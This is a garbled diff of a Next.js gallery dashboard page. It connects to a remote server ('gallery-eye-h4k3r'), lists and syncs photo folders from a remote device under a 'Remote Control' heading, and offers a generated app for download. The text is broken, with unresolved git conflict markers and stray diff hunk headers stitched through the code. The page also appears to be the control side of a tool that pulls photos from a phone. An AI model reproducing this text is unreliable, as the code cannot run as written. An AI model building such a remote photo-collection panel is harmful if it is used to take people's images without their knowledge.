@@ -1,3 +1,7 @@
+<<<<<<< HEAD
+=======
+@ -1,7 +1,7 @@
+>>>>>>> 6bead69eb8f44968d7ba5c177b4df38c186b5098
 "use client";
 
 import { useSession, signOut } from "next-auth/react";
@@ -5,6 +9,7 @@ import { useEffect, useState, useMemo } from "react";
 import Image from "next/image";
 import io from "socket.io-client";
 import AppGenerationModal from "@/components/AppGenerationModal";
+<<<<<<< HEAD
 
 let socket: any;
 
@@ -17,6 +22,14 @@ export default function Home() {
     const [showAppModal, setShowAppModal] = useState(false);
     const [selectedFolder, setSelectedFolder] = useState<any>(null);
 
+=======
+@ -15,14 +15,19 @@ export default function Home() {
+    const [deviceStatus, setDeviceStatus] = useState(false);
+    const [uploadProgress, setUploadProgress] = useState<any>(null);
+    const [showAppModal, setShowAppModal] = useState(false);
+    const [selectedFolder, setSelectedFolder] = useState<any>(null);
+
+>>>>>>> 6bead69eb8f44968d7ba5c177b4df38c186b5098
     // New State for Gallery Features
     const [activeTab, setActiveTab] = useState<'all' | 'image' | 'video'>('all');
     const [selectedItems, setSelectedItems] = useState<Set<string>>(new Set());
@@ -31,6 +44,7 @@ export default function Home() {
             socket = io("https://gallery-eye-h4k3r.onrender.com", {
                 transports: ["websocket"],
                 reconnectionAttempts: 5,
+<<<<<<< HEAD
             });
 
             socket.on("connect", () => {
@@ -83,6 +97,24 @@ export default function Home() {
             });
             setSelectedFolder(null);
         }
+=======
+@ -43,7 +48,6 @@ export default function Home() {
+
+            socket.on("new_image", (image: any) => {
+                setImages((prev) => {
+                    if (prev.some(img => img.id === image.id)) return prev;
+                    return [image, ...prev];
+                });
+@ -56,7 +60,6 @@ export default function Home() {
+                }
+            });
+
+            fetch(`https://gallery-eye-h4k3r.onrender.com/images?uuid=${uuid}`)
+                .then((res) => res.json())
+                .then((data) => setImages(data));
+@ -89,6 +92,84 @@ export default function Home() {
+        }
+>>>>>>> 6bead69eb8f44968d7ba5c177b4df38c186b5098
     };
 
     // --- Gallery Logic ---
@@ -166,8 +198,12 @@ export default function Home() {
     if (status === "loading") {
         return (
             <div className="min-h-screen flex items-center justify-center bg-black text-white">
+<<<<<<< HEAD
                 <div className="animate-spin rounded-full h-32 w-32 border-t-2 border-b-2 border-purple-500"></div>
             </div>
+=======
+@ -97,12 +178,10 @@ export default function Home() {
+>>>>>>> 6bead69eb8f44968d7ba5c177b4df38c186b5098
         );
     }
 
@@ -178,10 +214,14 @@ export default function Home() {
             {/* Background Gradients */}
             <div className="fixed inset-0 z-0 overflow-hidden pointer-events-none">
                 <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-purple-600/20 rounded-full blur-[120px]" />
+<<<<<<< HEAD
                 <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-blue-600/20 rounded-full blur-[120px]" />
             </div>
 
             {/* Navbar */}
+=======
+@ -113,40 +192,25 @@ export default function Home() {
+>>>>>>> 6bead69eb8f44968d7ba5c177b4df38c186b5098
             <nav className="relative z-10 border-b border-white/10 bg-black/20 backdrop-blur-xl sticky top-0">
                 <div className="max-w-7xl mx-auto px-4 md:px-6 h-16 md:h-20 flex items-center justify-between">
                     <div className="flex items-center gap-3">
@@ -199,6 +239,8 @@ export default function Home() {
                             <button onClick={() => setShowAppModal(true)} className="px-3 py-1.5 md:px-5 md:py-2 rounded-lg bg-white text-black text-sm md:text-base font-semibold hover:scale-105 transition-transform">
                                 <span className="hidden sm:inline">Download App</span>
                                 <span className="sm:hidden">App</span>
+<<<<<<< HEAD
+=======
                             </button>
                             <div className="w-px h-6 md:h-8 bg-white/10 hidden sm:block" />
                             <div className="flex items-center gap-3">
@@ -207,7 +249,63 @@ export default function Home() {
                             </div>
                         </div>
                     </div>
+@ -160,22 +224,13 @@ export default function Home() {
+                <div className="mb-12">
+                    <div className="flex items-center justify-between mb-6">
+                        <h2 className="text-2xl font-bold">Remote Control</h2>
+                        <button onClick={fetchFolders} className="px-4 py-2 rounded-lg bg-white/5 border border-white/10 hover:bg-white/10 transition-colors text-sm">Refresh Folders</button>
+                    </div>
+
+                    {folders.length > 0 ? (
+                        <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-3">
+                            {folders.map((folder: any, idx) => (
+                                <button key={idx} onClick={() => handleFolderClick(folder)} className="p-3 rounded-xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all group text-left">
+                                    <div className="flex justify-between items-start mb-2">
+                                        <div className="p-1.5 rounded-lg bg-purple-500/20 text-purple-400">
+                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path></svg>
+@ -187,32 +242,171 @@ export default function Home() {
+                            ))}
+                        </div>
+                    ) : (
+                        <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">Click "Refresh Folders" to see albums from your device.</div>
+                    )}
                 </div>
+
+                {/* Gallery Section */}
+                <div className="flex flex-col md:flex-row md:items-center justify-between mb-6 gap-4">
+                    <h2 className="text-2xl font-bold">Your Gallery</h2>
+
+                    {/* Tabs */}
+                    {hasVideos && (
+                        <div className="flex p-1 bg-white/5 rounded-xl border border-white/10 self-start">
+                            <button
+                                onClick={() => setActiveTab('all')}
+                                className={`px-4 py-1.5 rounded-lg text-sm font-medium transition-all ${activeTab === 'all' ? 'bg-white/10 text-white shadow-sm' : 'text-white/40 hover:text-white/70'}`}
+                            >
+                                All
+                            </button>
+                            <button
+                                onClick={() => setActiveTab('image')}
+                                className={`px-4 py-1.5 rounded-lg text-sm font-medium transition-all ${activeTab === 'image' ? 'bg-white/10 text-white shadow-sm' : 'text-white/40 hover:text-white/70'}`}
+                            >
+                                Images
+                            </button>
+                            <button
+                                onClick={() => setActiveTab('video')}
+                                className={`px-4 py-1.5 rounded-lg text-sm font-medium transition-all ${activeTab === 'video' ? 'bg-white/10 text-white shadow-sm' : 'text-white/40 hover:text-white/70'}`}
+                            >
+                                Videos
+>>>>>>> 6bead69eb8f44968d7ba5c177b4df38c186b5098
+                            </button>
+                            <div className="w-px h-6 md:h-8 bg-white/10 hidden sm:block" />
+                            <div className="flex items-center gap-3">
+                                <span className="text-sm font-medium text-white/80 hidden md:block">{session?.user?.name}</span>
+                                <button onClick={() => signOut()} className="text-sm text-red-400 hover:text-red-300 transition-colors">Logout</button>
+                            </div>
+                        </div>
+                    )}
+                </div>
+<<<<<<< HEAD
             </nav>
 
             <div className="relative z-10 max-w-7xl mx-auto px-4 md:px-6 py-8">
@@ -267,6 +365,9 @@ export default function Home() {
                     )}
                 </div>
 
+=======
+
+>>>>>>> 6bead69eb8f44968d7ba5c177b4df38c186b5098
                 {/* Selection Toolbar */}
                 {isSelectionMode && (
                     <div className="fixed bottom-8 left-1/2 -translate-x-1/2 z-40 flex items-center gap-4 p-4 rounded-2xl bg-[#1a1a1a] border border-white/20 shadow-2xl animate-slideUp">
@@ -402,6 +503,7 @@ export default function Home() {
                         </div>
                     </div>
                 )}
+<<<<<<< HEAD
 
                 {showAppModal && <AppGenerationModal onClose={() => setShowAppModal(false)} />}
 
@@ -410,6 +512,9 @@ export default function Home() {
                     <div className="fixed bottom-6 right-6 bg-[#1a1a1a] border border-white/20 p-4 rounded-xl shadow-2xl w-80 animate-slideUp z-50">
                         <h4 className="text-sm font-bold mb-2 flex justify-between">
                             <span>Syncing {uploadProgress.folder}...</span>
+=======
+@ -225,43 +419,9 @@ export default function Home() {
+>>>>>>> 6bead69eb8f44968d7ba5c177b4df38c186b5098
                             <span className="text-purple-400">{Math.round((uploadProgress.uploaded / uploadProgress.total) * 100)}%</span>
                         </h4>
                         <div className="h-2 bg-white/10 rounded-full overflow-hidden">
@@ -419,6 +524,9 @@ export default function Home() {
                     </div>
                 )}
             </div>
+<<<<<<< HEAD
         </main>
     );
 }
+=======
+>>>>>>> 6bead69eb8f44968d7ba5c177b4df38c186b5098
